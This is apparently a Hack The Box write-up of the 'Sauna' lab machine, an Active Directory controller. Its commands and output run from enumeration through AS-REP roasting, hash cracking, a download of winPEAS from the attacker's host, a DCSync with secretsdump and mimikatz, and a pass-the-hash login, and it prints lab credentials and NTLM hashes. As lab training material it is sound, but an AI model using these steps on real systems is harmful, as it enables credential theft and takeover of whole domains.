1,Recon
Port scan 
	53/tcp domain `Simple DNS Plus`
	80/tcp http `Microsoft IIS httpd 10.0`
	88/tcp `kerberos-sec`
	135/tcp RPC
	389/tcp ladp `Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)`
	445/tcp SMB
	5985/tcp http `Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)`
Enumerate the pages and services:
80/tcp http:
I did not find anything useful such as the login page or the web-console.
But there is something funny:`So many bank account managers but only one security manager`.In this team, only one security manager, that means we can try to brute the credit.

![](images/Pasted%20image%2020240919110758.png)

445/tcp SMB
```
smbmap -H 10.10.10.175
[+] Finding open SMB ports....
[+] User SMB session established on 10.10.10.175...
[+] IP: 10.10.10.175:445        Name: 10.10.10.175                                      
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
[!] Access Denied

smbclient -N -L //10.10.10.175           
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.175 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

This would need the right credit.

389/tcp LDAP
```
ldapsearch -x -H ldap://10.10.10.175 -s base namingcontexts

# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts 
#

#
dn:
namingcontexts: DC=EGOTISTICAL-BANK,DC=LOCAL
namingcontexts: CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
namingcontexts: CN=Schema,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
namingcontexts: DC=DomainDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL
namingcontexts: DC=ForestDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1


ldapsearch -x -H ldap://10.10.10.175 -b 'DC=EGOTISTICAL-BANK,DC=LOCAL'
# extended LDIF
#
# LDAPv3
# base <DC=EGOTISTICAL-BANK,DC=LOCAL> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# EGOTISTICAL-BANK.LOCAL
dn: DC=EGOTISTICAL-BANK,DC=LOCAL
objectClass: top
objectClass: domain
objectClass: domainDNS
distinguishedName: DC=EGOTISTICAL-BANK,DC=LOCAL
instanceType: 5
whenCreated: 20200123054425.0Z
whenChanged: 20240918152846.0Z
subRefs: DC=ForestDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL
subRefs: DC=DomainDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL
subRefs: CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
uSNCreated: 4099
dSASignature:: AQAAACgAAAAAAAAAAAAAAAAAAAAAAAAAQL7gs8Yl7ESyuZ/4XESy7A==
uSNChanged: 98336
name: EGOTISTICAL-BANK
objectGUID:: 7AZOUMEioUOTwM9IB/gzYw==
replUpToDateVector:: AgAAAAAAAAAGAAAAAAAAAEbG/1RIhXVKvwnC1AVq4o8WgAEAAAAAAK2C+
 xwDAAAAq4zveNFJhUSywu2cZf6vrQzgAAAAAAAAKDj+FgMAAADc0VSB8WEuQrRECkAJ5oR1FXABAA
 AAAADUbg8XAwAAAP1ahZJG3l5BqlZuakAj9gwL0AAAAAAAANDwChUDAAAAm/DFn2wdfEWLFfovGj4
 TThRgAQAAAAAAENUAFwMAAABAvuCzxiXsRLK5n/hcRLLsCbAAAAAAAADUBFIUAwAAAA==
 *******
```
There are many information about the dns and domain service.But I did not use that in the end.

53/tcp domain
In this place, I would want to try some possible domain name, but didn't work.
```
dig axfr @10.10.10.175 sauna.htb 

; <<>> DiG 9.20.1-1-Debian <<>> axfr @10.10.10.175 sauna.htb
; (1 server found)
;; global options: +cmd
; Transfer failed.

dig axfr @10.10.10.175 egotistical-bank.htb

; <<>> DiG 9.20.1-1-Debian <<>> axfr @10.10.10.175 egotistical-bank.htb
; (1 server found)
;; global options: +cmd
; Transfer failed.
```

Kerberos - UDP (and TCP) 88
```
kerbrute userenum -d EGOTISTICAL-BANK.LOCAL /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc 10.10.10.175

We can use kerbrute, but don't have arm64 version, so I would use crackmapexec to replace it.

crackmapexec smb 10.10.10.175 -u /usr/share/wordlists/Seclists/Usernames/xato-net-10-million-usernames.txt -p '' --kerberos -d EGOTISTICAL-BANK.LOCAL

2020/02/15 14:41:59 >  [+] VALID USERNAME:       administrator@EGOTISTICAL-BANK.LOCAL
2020/02/15 14:42:46 >  [+] VALID USERNAME:       hsmith@EGOTISTICAL-BANK.LOCAL
2020/02/15 14:42:54 >  [+] VALID USERNAME:       Administrator@EGOTISTICAL-BANK.LOCAL
2020/02/15 14:43:21 >  [+] VALID USERNAME:       fsmith@EGOTISTICAL-BANK.LOCAL
2020/02/15 14:47:43 >  [+] VALID USERNAME:       Fsmith@EGOTISTICAL-BANK.LOCAL
2020/02/15 16:01:56 >  [+] VALID USERNAME:       sauna@EGOTISTICAL-BANK.LOCAL
2020/02/16 03:13:54 >  [+] VALID USERNAME:       FSmith@EGOTISTICAL-BANK.LOCAL
2020/02/16 03:13:54 >  [+] VALID USERNAME:       FSMITH@EGOTISTICAL-BANK.LOCAL
```

In this place, `fsmith` would be very interesting for us.
![](images/Pasted%20image%2020240919113134.png)
I guess this username is for him.

`m0chan has a great post on attacking Kerberos that includes AS-REP Roasting. Typically, when you try to request authentication through Kerberos, first the requesting party has to authenticate itself to the DC. But there is an option, DONT_REQ_PREAUTH where the DC will just send the hash to an unauthenticated user. AS-REP Roasting is looking to see if any known users happen to have this option set.`
`https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html#as-rep-roasting`

I’ll use the list of users I collected from Kerbrute, and run GetNPUsers.py to look for vulnerable users. Three come back as not vulnerable, but one gives a hash:
```
/opt/utilities/impacket/examples/GetNPUsers.py 'EGOTISTICAL-BANK.LOCAL/' -usersfile user.txt -format hashcat -outputfile hashes.aspreroast -dc-ip 10.10.10.175

GetNPUsers.py 'EGOTISTICAL-BANK.LOCAL/' -usersfile users.txt -format hashcat -outputfile hashes.aspreroast -dc-ip 10.10.10.175
Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation

[-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User hsmith doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User sauna doesn't have UF_DONT_REQUIRE_PREAUTH set

cat hashes.aspreroast 
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:a89b6e78741dfb23312bc04c1892e558$a9aff5e5a5080949e6e4f4bbd690230277b586e7717b3328a80b636872f77b9deb765e5e6fab3c51b4414452bc4d4ad4a1705b2c5c42ea584bfe170fa8f54a89a095c3829e489609d74fd10a124dbf8445a1de2ed213f4682a679ab654d0344ff869b959c79677790e99268944acd41c628e70491487ffb6bcef332b74706ccecf70f64af110897b852d3a8e7b3e55c740c879669481115685915ec251e0316b682a5ca1c77b5294efae72d3642117d84429269f5eaea23c3b01b6beaf59c63ffaf5994e180e467de8675928929b754db7fc8c7e773da473649af149def29e5ffb5f94b5cb7912b68ccbee741b6e205ce8388d973b9b59cf7c8606de4bb149c0
```

Then we can use hashcat to crack it and get the credit.
we get the password `Thestrokes23`, and we can use `evil-winrm` to exploit it.

2, shell as fsmith
If we want to continue enumerate, we can choose to use the `winPeas`
```
upload it:
powershell wget http://10.10.14.65/winPEASx64.exe -outfile winPEASx64.exe
```
There is something useful for us
```
ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for AutoLogon credentials
    Some AutoLogon credentials were found
    DefaultDomainName             :  EGOTISTICALBANK
    DefaultUserName               :  EGOTISTICALBANK\svc_loanmanager
    DefaultPassword               :  Moneymakestheworldgoround!

```
We would check it by reading the registry with PowerShell:
![](images/Pasted%20image%2020240919115506.png)
That means it was right for this user `svc_loanmanager`
But there is no this user in the `net user`
```
User accounts for \\

-------------------------------------------------------------------------------
Administrator            FSmith                   Guest
HSmith                   krbtgt                   svc_loanmgr
```
But I think `svc_loanmgr` would be the target.

I ran winPEAS.exe again, but nothing new jumped out at me. Since there’s AD stuff going on, I went to Bloodhound.
Then we need to upload the `SharpHound.exe` and download the Generated Files

Analysis data:
I’ll import the .zip file into BloodHound by clicking the Upload Data button on the top right. Tt reports success, leaving me at a blank page. There are canned queries that might be useful, but I like to start with the user(s) I already have access to. I’ll search for SVC_LOANMGR@EGOTISTICAL-BANK.LOCAL in the bar at the top left, and it comes up on the graph. On the left, I’ll want to look for Outbound Object Control - These are items that this user has rights over. In this case, there is one:
![](images/Pasted%20image%2020240919122422.png)

Clicking the “1” add that item to the graph:
![](images/Pasted%20image%2020240919122434.png)
This account has access to GetChanges and GetChangesAll on the domain. Googling that will quickly point to a low of articles on the DCSync attack, or I can right click on the label (you have to get in just the right spot) and get the menu for it:
![](images/Pasted%20image%2020240919122449.png)
Clicking help, there’s a Abuse Info tab that includes instructions for how to abuse this privilege:
![](images/Pasted%20image%2020240919122500.png)

My preferred way to do a DCSync attack is using secretsdump.py, which allows me to run DCSync attack from my Kali box, provided I can talk to the DC on TCP 445 and 135 and a high RPC port. This avoids fighting with AV, though it does create network traffic.

I need to give it just a target string in the format [username]:[password]@[ip]:
```
python3 /opt/utilities/impacket/examples/secretsdump.py 'svc_loanmgr:Moneymakestheworldgoround!@10.10.10.175'

```

I can also use Mimikatz like BloodHound suggested. I’ll download the latest release from the release page, and upload the 64-bit binary to Sauna:

Mimikatz can be super finicky. Ideally I can run it and drop to a Mimikatz shell, but for some reason on Sauna it just started spitting the prompt at my repeatedly and I had to kill my session. It’s always safer to just run mimikatz.exe with the commands you want to run following it from the command line.

```
*Evil-WinRM* PS C:\programdata> .\mimikatz 'lsadump::dcsync /domain:EGOTISTICAL-BANK.LOCAL /user:administrator' exit

  .#####.   mimikatz 2.2.0 (x64) #19041 May 19 2020 00:48:59
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)           
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com ) 
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/ 

mimikatz(commandline) # lsadump::dcsync /domain:EGOTISTICAL-BANK.LOCAL /user:administrator
[DC] 'EGOTISTICAL-BANK.LOCAL' will be the domain
[DC] 'SAUNA.EGOTISTICAL-BANK.LOCAL' will be the DC server
[DC] 'administrator' will be the user account
                                                                         
Object RDN           : Administrator    
                                                                         
** SAM ACCOUNT **                                                        
                                                                         
SAM Username         : Administrator    
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   :                                                   
Password last change : 1/24/2020 10:14:15 AM
Object Security ID   : S-1-5-21-2966785786-3096785034-1186376766-500
Object Relative ID   : 500                                               
                                                                         
Credentials:
  Hash NTLM: 823452073d75b9d1cf70ebdf86c7f98e
    ntlm- 0: 823452073d75b9d1cf70ebdf86c7f98e
    ntlm- 1: d9485863c1e9e05851aa40cbb4ab9dff
    ntlm- 2: 7facdc498ed1680c4fd1448319a8c04f
    lm  - 0: 365ca60e4aba3e9a71d78a3912caf35c
    lm  - 1: 7af65ae5e7103761ae828523c7713031
                                                                         
Supplemental Credentials:                                                
* Primary:NTLM-Strong-NTOWF *                                            
    Random Value : caab2b641b39e342e0bdfcd150b1683e
                                                                         
* Primary:Kerberos-Newer-Keys *                                          
    Default Salt : EGOTISTICAL-BANK.LOCALAdministrator
    Default Iterations : 4096                                            
    Credentials
...[snip]...

```

This spits out a ton of information. The hash I need (that matches the secretsdump output) is the Hash NTLM in the middle above. I could also use /all instead of /user:administrator to dump the entire user cache, but administrator is all I need here.

Then we can use `evil-winrm` to catch the SYSTEM shell
`evil-winrm -i 10.10.10.175 -u administrator -H 823452073d75b9d1cf70ebdf86c7f98e`
